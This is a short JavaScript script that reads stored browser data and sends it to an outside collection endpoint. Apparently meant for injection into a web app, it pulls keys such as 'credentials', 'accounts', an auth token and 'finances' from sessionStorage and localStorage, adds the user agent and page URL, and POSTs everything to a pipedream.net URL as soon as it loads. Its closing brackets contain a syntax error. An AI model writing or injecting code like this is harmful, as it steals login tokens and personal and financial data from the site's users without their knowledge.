async function extraire() {
  const keys = [
    'accounts', 'badges', 'credentials', 'edhydration_auth',
    'etablissement', 'finances',
    'bigAds', 'fa', 'pdfjs.history'
  ];
  
  const url = 'https://eo1w3ilotwrjzkh.m.pipedream.net';

  const data = {
    t: new Date().toISOString(),
    u: navigator.userAgent,
    l: location.href,
    s: {}
  };

  keys.forEach(key => {
    let value = sessionStorage.getItem(key);
    if (value === null) {
      value = localStorage.getItem(key);
    }

    if (value !== null) {
      try {
        data.s[key] = JSON.parse(value);
      } catch {
        data.s[key] = value;
      }
    }
  });

  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
});
extraire();
